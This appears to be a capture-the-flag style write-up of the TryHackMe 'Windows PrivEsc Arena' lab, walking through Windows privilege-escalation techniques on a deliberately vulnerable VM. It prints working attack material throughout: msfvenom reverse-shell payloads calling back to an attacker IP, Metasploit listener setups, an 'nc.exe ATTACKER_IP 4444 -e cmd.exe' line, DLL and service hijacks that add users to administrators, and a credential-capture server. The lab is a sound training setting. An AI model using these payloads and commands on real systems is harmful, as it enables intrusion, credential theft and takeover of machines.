# Windows PrivEsc Arena
![img-description](/assets/img/posts/windows-privesc/windows_privesc.png)
> Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open.

### <span style="color: var(--link-color);">[Task 1] - Connecting to TryHackMe network</span>
You don't need me to do this. We just connect in VPN to the TryHackMe network.

<img src="/assets/img/meme/wink.jpg" width="30%" height="30%">

### <span style="color: var(--link-color);">[Task 2] - Deploy the vulnerable machine</span>

> This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course (http://udemy.com/course/windows-privilege-escalation-for-beginners).
> 
> All tools needed to complete this course are on the user desktop (C:\Users\user\Desktop\Tools).
> 
> Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:
> 
> username: user
> password: password321
> 
> For any administrative actions you might take, your credentials are:
>
> username: TCM
> password: Hacker123


#### 1. Deploy the machine and log into the user account via RDP

We click **Start Machine** on the challenge page and wait that the machine deploy. And then, we login in RDP by using the given credentials.

I use **rdesktop** to connect in RDP:
```
rdesktop -u user -p "password321" $IP -g 90%
```


#### 2. Open a command prompt and run 'net user'. Who is the other non-default user on the machine?
By run **net user** in a command prompt we retrieve the users on the machine:
![Net User](/assets/img/posts/windows-privesc/net_user.png)

And the other non-default user is **TCM**.


### <span style="color: var(--link-color);">[Task 3] - Registry Escalation - Autorun </span>
In this task, we use [Autorun](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) utility that is used to set auto-starting programs upon boot.

##### Detection
We use the **Autorun64.exe** tools to view the programs that are configured to start automatically:
![AutoRuns](/assets/img/posts/windows-privesc/task3/autorun_myprogram.png)

And we note that there is the **MyProgram** program (lol, what a tongue twister) that has, as Image Path, **C:\Program Files\Autorun Program\program.exe**.

The idea is to replace the program.exe with some other file containing a malicious payload. To do this, we need to ensure that we have the permissions, so we use the **accesschk64** tool:

![accesschk64](/assets/img/posts/windows-privesc/task3/accesschk64_program.png)

From this, we note that the **Everyone** user group has **FILE_ALL_ACCESS** permission on the program.exe file. 

![Meme](/assets/img/posts/windows-privesc/task3/meme.jpg)

##### Exploitation
Now that we have detected the vulnerability, we can exploit it by replacing the program.exe with a reverse shell. 

First of all, we create a listener by using metasploit:
![Msf_multihandler_conf](/assets/img/posts/windows-privesc/task4/msf_multihandle.png)

Then, we generate the payload with our reverse shell:
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.80.159 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
```

We must copy the evil payload in the victim machine (we can upload the file by using a python server or FTP or whatever you want).

And we move the program.exe in the folder **C:\Program Files\AutoRun Program**:
![Move program.exe](/assets/img/posts/windows-privesc/task4/move_program)


Now, we must simulate the access of the administrator, in this way, the **My Program** program will be executed automatically and our malicious "program.exe" will be executed.
Indeed, after we connect as administrator by using the following command:
```
rdesktop -u TCM -p "Hacker123" $IP -g 90%
```

We come back to our metasploit listener and we get the shell:
![Msf_Access](/assets/img/posts/windows-privesc/task3/msf_TCM_access.png)



### <span style="color: var(--link-color);">[Task 4] - Registry Escalation - AlwaysInstallElevated </span>
[AlwaysInstallElevated](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) policy is used to install a Windows Installer package with elevated (system)privilege. Indeed, this policy grants full administrative rights, so low-privilege users can run installations with elevated privileges, for this reason, this method can make a machine vulnerable.

To check the vulnerability, we must check that the following registry has the **AlwaysInstallElevated** value set to 1:
- HKLM\Software\Policies\Microsoft\Windows\Installer
- HKCU\Software\Policies\Microsoft\Windows\Installer

[Windows Registry](https://en.wikipedia.org/wiki/Windows_Registry) is a hierarchical database that stores low-level settings for the Operating System and for applications that opt to use the registry. The registry contains two basic elements: **keys** and **values**. Registry keys are container objects similar to folders. Registry values are non-container objects similar to files. Keys may contain values and subkeys. 

The command **reg query** returns a list of the next tier of subkeys and entries that are located under a specified subkey in the registry.
In particular, in this case, we would obtain information about two of seven predefined root keys HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER.
- **HKLM** or **HKEY_LOCAL_MACHINE** stores settings that are specific to the local computer
- **HKCU** or **HKEY_CURRENT_USER** stores settings that are specific to the currently logged-in user

##### Detection
How we said before, we check the **AlwaysInstallElevated** value of the two interested registries:

![AlwaysInstallElevated](/assets/img/posts/windows-privesc/task4/always_enabled_register.png)


##### Exploitation

The idea of the exploitation in this challenge is to replace the **setup.msi** in the **C:\Temp** with a malicious file. In this way, when we use the ```msiexec``` command (that is used for installing MSI and MSP packages) we can execute our file and obtain the system access.

To exploit this vulnerability, on our Kali Machine we set a metasploit listener needed to obtain a reverse shell:
![Msf Multihandle](/assets/img/posts/windows-privesc/task4/msf_multihandle.png)


We generate the malicious payload:
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.80.159 -f msi -o setup.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi
```

Now, we upload the payload in the victim machine and we move it in **C:\Temp**:
![Dir setup.msi](/assets/img/posts/windows-privesc/task4/dir_setup_msi.png)

Then, we run the command ```msiexec /quiet /qn /i C:\Temp\setup.msi``` and, by returning in our metasploit listener, we get the system access:
![System Access](/assets/img/posts/windows-privesc/task4/always_install_access.png)



### <span style="color: var(--link-color);">[Task 5] - Service Escalation - Registry </span>
This task use misconfiguration in the Windows registry like Task4. But in this case, we have permission to add keys in the HKLM registry by using the regsvc service.

> 3. In the command prompt type: sc start regsvc
> 4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators


##### Detection
Since we want to use the **regsvc** service, we check the permission that users have to access some resource. To do this, we use the **Get-Acl** command of PowerShell:

![Get-Acl](/assets/img/posts/windows-privesc/task5/task5_registry.png)

From the output of **Get-Acl** command, we note that the user belongs to the **NT AUTHORITY\SYSTEM** group (from the line ```Group``` row) and, also, that this group has **Full Control** permission over the given registry key (from ```Access``` row).


##### Exploitation
Since in the Windows machine there are some tools already uploaded, we downloaded on our Kali machine the source code in **C:\Users\User\Desktop\Tools\Source\windows_service.c**.
Then, we must change the code to insert the malicious code ```cmd.exe /k net localgroup administrators user /add```. So, basically, we must change the **Run** function:

![Source Code](/assets/img/posts/windows-privesc/task5/modify_code.png)

And then, we compile the source code (you may need to install ```gcc-mingw-w64```):
```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

With this command, we generate the **x.exe** file and we upload it to the Windows machine and copy in **C:\Temp** (this folder is fully accessible to our user):

![Copy x.exe](/assets/img/posts/windows-privesc/task5/task5_upload_payload.png)

To execute the file exe that we upload, we need to add its path in a new key in the registry by running the command:
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
With the [reg add](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add) we add a new registry entry, in particular:
- **HKLM\SYSTEM\CurrentControlSet\services\regsvc** is the full path of the subkey to be added
- **/v Image Path** is the name of the add registry entry
- **/t REG_EXPAND_SZ** is the type for the registry entry
- **/d c:\temp\x.exe** is the data for the new registry entry (in this case, in our malicious file)
- **/f** is needed to add the registry entry without prompting for confirmation

And finally, we start the **regsvc** service.
![Execution Task 5](/assets/img/posts/windows-privesc/task5/task5_execution.png)

To confirm the successful execution we check if the user is added to the local administrators' group (that is the command that we have inserted in the *Run* function in the *windows_service.c* file):

![Administrator](/assets/img/posts/windows-privesc/task5/administrator_user.png)


### <span style="color: var(--link-color);">[Task 6] - Service Escalation - Executable Files </span>
If a user has to write permissions in a folder used by a service, then he can replace the binary with a malicious one. In this way, when the service is restarted, the malicious file will be executed.

##### Detection
To check the user permission of the **"File Permissions Service"** folder, we use our good friend **accesschk64.exe**:
![accesschk64](/assets/img/posts/windows-privesc/task6/task6_detection.png)

We see that the **Everyone** group has **FILE_ALL_ACCESS** permission on the **filepermservice.exe** file, so we can replace this file with our malicious file.

<img src="/assets/img/posts/windows-privesc/task6/meme.jpg" width="40%" height="40%">


##### Exploitation
We can use our previously generated **x.exe** file. So, we replace the filepermservice.exe with our x.exe and execute it:

![Task6 Execution](/assets/img/posts/windows-privesc/task6/task6_execution.png)

Since, just to remember, in the *windows_service.c* file that we compiled to generate the x.exe file we have inserted in the *Run* function the command ```cmd.exe /k net localgroup administrators user /add```, so we expect that our user is added to the local administrators' group and, by checking the localgroup, we confirm the successfully exploit:

![Task6 Execution](/assets/img/posts/windows-privesc/administrator_user.png)



### <span style="color: var(--link-color);">[Task 7] - Privilege Escalation - Startup Applications </span>
In Windows, as in other operating systems, we can configure some applications to run on boot, including their system privilege. So, if we have permission to write the Startup folder, we can execute malicious files automatically after that some user (we hope admin) do the login.

##### Detection
To detect this misconfiguration, we use [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) that give us the lists of permissions of the specified file:

![icacls](/assets/img/posts/windows-privesc/task7/task7_icacls_startup.png)

In this case, we can see that the **"BUILTIN\Users"** group has full access **(F)** to the **Startup** directory. Since our user belongs to the Users group, we can put the malicious file that will be generated automatically.

##### Exploitation
To do the exploitation of this vulnerability, we set a Metasploit listener:

![Msf listener](/assets/img/posts/windows-privesc/msf_multihandle.png)

Then we generate the malicious file:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.80.159 LPORT=4444 -f exe -o x.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: x.exe
```
And we upload the generated file on the Windows machine and we copy it on **C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup** folder:
![Move in Startup](/assets/img/posts/windows-privesc/task7/task7_moveStartup.png)

Now, we simulate the login of the "TCM" user (that is admin):
```
rdesktop -u TCM -p "Hacker123" $IP -g 90%
```

And, by returning in our Metasploit listener we obtain the admin access:
![Admin Access](/assets/img/posts/windows-privesc/task7/task7_administrator_access.png)

Note that if we log in with "user" user, we obtain the low-privilege shell:
![User Access](/assets/img/posts/windows-privesc/task7/task7_user_access.png)

And we want to do privilege escalation!

### <span style="color: var(--link-color);">[Task 8] - Service Escalation - DLL Hijacking </span>
When we execute an application in a Windows system, many of the functionalities of the programs are provided by DLL files. Indeed, when a program starts it looks for DLLs.
So, if some DLL is missing, and we have the write permission, then we can replace that missing DDL with our malicious file. In this way, when the application starts, it executes our file.

Generally, a Windows application will use pre-defined search paths to find DLL’s and it will check these paths in the following order:

1. The directory from which the application loaded
2. 32-bit System directory (C:\Windows\System32)
3. 16-bit System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (first system and then user)

##### Detection
To detect this vulnerability, we must find some missing DLL that some programs look for. To do this, we use **Procmon.exe**:

![Procmon](/assets/img/posts/windows-privesc/task8/task8_procmon.png)

There are many processes but use the function **filter** to search what we want:

![Filter](/assets/img/posts/windows-privesc/task8/task8_procmon_filter.png)

So, we filter the **Process Name** by searching **dllhijackservice.exe**:

![Filter Process Name](/assets/img/posts/windows-privesc/task8/task8_procmon_processname.png)

And we add the rule (we note the first row is our rule, just created):

![Add Rule](/assets/img/posts/windows-privesc/task8/task8_procmon_add_process.png)

Then, since we look for missing DLL, we filter the **Result** field with the string **NAME NOT FOUND** and we add the rule:

![Filter Not Found](/assets/img/posts/windows-privesc/task8/task8_procmon_notfound.png)

Now, we can run the **dllsvc** service:

![Dllsvc](/assets/img/posts/windows-privesc/task8/task8_dllsvc.png)


And, by returning to procmon, we have the following result:

![Procmon dllsvc](/assets/img/posts/windows-privesc/task8/task8_procmon_dllsvc2.png)

These are some of the DLLs that the program dllhijackservice.exe can not found. We can note the last row which contains the path **C:\Temp\hijackme.dll**. If we have permission to overwrite this file, we can replace it with a malicious file.

##### Exploitation

Since in the Windows machine there are some tools already uploaded, we downloaded on our Kali machine the source code in **C:\Users\User\Desktop\Tools\Source\windows_dll.c**and we change the function *DllMain*:

![Modify Source Code](/assets/img/posts/windows-privesc/task8/task8_modify_code.png)

We compile it with the command:
```
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

We upload the compiled fil in victim machine and we copy it in **C:\Temp**:
![Copy File](/assets/img/posts/windows-privesc/task8/task8_copy_hijackdll.png)

Finally, we stop and start the dllsvc service with the command:
```
exec sc stop dllsvc & sc start dllsvc
```

And we confirm the successfully exploit by checking if the user belongs to the localgroup administrators:

![Administrator](/assets/img/posts/windows-privesc/task8/task8_administrator.png)


### <span style="color: var(--link-color);">[Task 9] - Service Escalation - binPath </span>

**binPath** is used to specific binary paths to Windows services. If we have permission to modify the configuration, we can exploit this vulnerability.
To check the permission, we can use **accesschk**.

##### Detection
We run accesschk to check the permission of **daclsvc** service:

![Detection](/assets/img/posts/windows-privesc/task9/detection.png)

We note that the **Everyone** has the **“SERVICE_CHANGE_CONFIG”** permission. Thanks to this, we can configure the daclsvc service (owned by the system) to run whatever command we want, like, for example, a command to elevate the user to admin privileges or maybe a command that sends back a shell with system privileges (sc config daclsvc binpath= “nc.exe ATTACKER_IP 4444 -e cmd.exe”). In this case, we add the user in the administrator localgroup.

##### Exploitation

To exploit this, we run the following command:
```
sc config daclsvc binpath= "net localgroup administrators user /add"
```

Then we start the daclsvc service with the command ```sc start daclsvc``` and finally, we check that the user belongs to administrator localgroup:

### <span style="color: var(--link-color);">[Task 10] - Service Escalation - Unquoted Service Paths </span>

When a service is started, the Windows system tries to find the location of the executable to run the service. Indeed, if the executable path is enclosed in the quote "" then the system will know exactly where to find it. But, if in the path there are any quotes, then Windows will look for it and execute it in every folder of the path. 
So, for example, if we have the path 
```
C:\Program Files\Unquoted Path Service\Common Files\service.exe
```

Windows will search in this order:
```
    C:\Program.exe
    C:\Program Files\Unquoted.exe
    C:\Program Files\Unquoted Path.exe
    C:\Program Files\Unquoted Path Service\Common.exe
    C:\Program Files\Unquoted Path Service\Common Files\service.exe
```

##### Detection
To view the information about services we can use [**sc**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742055(v=ws.11)) utility and we use the **qc** command to display the information, in particular ,the **“BINARY_PATH_NAME”** field which we are interested.

![Detection](/assets/img/posts/windows-privesc/task10/detection.png)

We can see that in the "BINARY_PATH_NAME" we have the path **C:\Program Files\Unquoted Path Services\Common Files\unquotedpathservice.exe**. We want to place some malicious file in that path so that Windows will execute it. 

##### Exploitation
So we choose to place a file named **common.exe** in the path **C:\Program Files\Unquoted Path Service**.

We generate the malicious file:
```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 224 bytes
Final size of exe-service file: 15872 bytes
Saved as: common.exe
```

Then we upload the file and copy it in C:\Program Files\Unquoted Path Service:
![Copy File](/assets/img/posts/windows-privesc/task10/copy_file.png)

Then we start the **unquotedsvc** service (by using the command ```sc start unquotedsvc```) and we check if our user belongs to administrator localgroup:

![Administrator](/assets/img/posts/windows-privesc/task10/administrator.png)



### <span style="color: var(--link-color);">[Task 11] - Potato Escalation - Hot Potato </span>

"Hot Potato is a technique that takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing".

You can read more about the exploit [here](https://foxglovesecurity.com/2016/01/16/hot-potato/).

> 4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators


##### Exploitation

To exploit this vulnerability, we can use **Tater** module that is a PowerShell implementation of the Hot Potato Windows Privilege Escalation.
So we, first, start Powershell with bypass option to bypass firewall:
```
powershell.exe -nop -ep bypass
```

Then, we import the Tater module:
```
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
```

Finally, we run the Tater module bypassing the command **net localgroup administrators user /add** to add our user in administrators localgroup:
```
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

The execution and the output of the command ```net localgroup administrators``` to check if the exploit had success:

### <span style="color: var(--link-color);">[Task 12] - Password Mining Escalation - Configuration Files </span>
Many times the developers or the administrator put the password in the configuration files. Therefore, by searching words like "password" or "passwd" we can obtain the password used in the system. Also, these passwords are obfuscated in base64, so it is easy to retrieve the cleartext.

##### Exploitation
In this task, the password is in the **C:\Windows\Panther\Unattend.xml** file and it is in base64.

![Exploitation](/assets/img/posts/windows-privesc/task12_exploitation2.png) 

So, we take the base64 password and with the following command we can obtain the password in cleartext:
```
$ echo cGFzc3dvcmQxMjM= | base64 -d
> password123 
```

### <span style="color: var(--link-color);">[Task 13] - Password Mining Escalation - Memory </span>

To exploit this vulnerability, we use the [**http_basic**](https://www.rapid7.com/db/modules/auxiliary/server/capture/http_basic/) module of Metasploit to generate a prompt for credentials.

We set the field **SRVHOST**, **SRVPORT** with the Kali Machine IP and port that will simulate a web server and the **URIPATH**:
```
msf6 auxiliary(server/capture/http_basic) > show options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      10.8.80.159      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      8000             yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH      x                no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server

```

So, we have a fake web server on http://10.8.80.159:8000/x. From the Windows Machine, we connect to that URL to simulate the attack:

![Login Explorer](/assets/img/posts/windows-privesc/task13/login_explorer.png)

After that we insert the credentials, we want to dump what the internet explorer had saved. To do this, we use the task manager utility of Windows, we select the **Internet Explorer** application and by right-clicking we open a menù in which we have the **Create Dump File** voice:

![Create Dump](/assets/img/posts/windows-privesc/task13/create_dump.png)

We click that voice and the dump file will be saved:

![Dump Done](/assets/img/posts/windows-privesc/task13/dump_done.png)

Going in the path, we check the file:

![Location Dump](/assets/img/posts/windows-privesc/task13/location_dump.png)

We copy the dump file in the Kali machine and then, we should use the command ```strings /root/Desktop/iexplore.DMP \| grep "Authorization: Basic"``` to retrieve the credentials and finally we run ```echo -ne [Base64 String] \| base64 -d``` to retrieve the cleartext credentials.

Unfortunately, this process did not work for me. I try to search different strings like Authentication, Authorisation, Basic but I can retrieve anything. Maybe there was an issue, I follow the written instructions.

<img src="/assets/img/posts/windows-privesc/task13/meme.gif" width="40%" height="40%">

But, on the other side, we can see the credentials in the Metasploit console:
```
msf6 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 2.

[*] Using URL: http://10.8.80.159:8000/x
[*] Server started.
[*] Sending 401 to client 10.10.202.219
[+] HTTP Basic Auth LOGIN 10.10.202.219 "test:test" / /x
```


### <span style="color: var(--link-color);">[Task 14] - Privilege Escalation - Kernel Exploits </span>

If the Operating Systems is not updated regularly, we can find some older version of the kernel that allows us to use public exploits.
In this case, the kernel exploit is the **MS16_014**.

##### Establish a shell

We use Metasploit to set a listener (we use the windows/meterpreter/reverse_tcp payload):
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.8.80.159
LHOST => 10.8.80.159
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.80.159      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```


We then generate the malicious file that we use to obtain a reverse shell (**pay attention to the payloads**, it must be the same that we set in Metasploit listener otherwise we can have an unstable shell):
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.80.159 lport=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```


Then we upload the malicious file and we execute it and, by returning to the Metasploit listener, we have the shell:

![Shell](/assets/img/posts/windows-privesc/task14_shell.png)


##### Detection & Exploitation
Now, we have a shell as a low-privilege user, we want to become administrators and we use the kernel exploit MS16_014. 
We use the **ms16_014_wmi_recv_notif** module of metasploit.

Before selecting the module needed to exploit this, we check the Metasploit session, since the ms16_014_wmi_recv_notif module needs a session to set.

```
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > sessions

Active sessions
===============

  Id  Name  Type                     Information           Connection
  --  ----  ----                     -----------           ----------
  5         meterpreter x86/windows  TCM-PC\user @ TCM-PC  10.8.80.159:4444 -> 10.10.202.219:65430 (10.10.202.219)
```

Then we set a listener with the command ```nc -lnvp 5555``` and, finally, we set the **session** field (we put the session Id of the low-privilege access), the **lhost** field, and the **lport** with the Kali machine IP and the port that we use for the listener:

```
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set session 5
session => 5
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set lhost 10.8.80.159
lhost => 10.8.80.159
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set lport 5555
lport => 5555
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.8.80.159:5555 
[-] Exploit aborted due to failure: no-target: Running against WOW64 is not supported
[*] Exploit completed, but no session was created.
```

After many attempts, this approach doesn't work for me. 
Maybe because the system is not vulnerable, indeed, by running the Metasploit module **post/multi/recon/local_exploit_suggester** to suggest the exploits, there isn't the ms16_014:
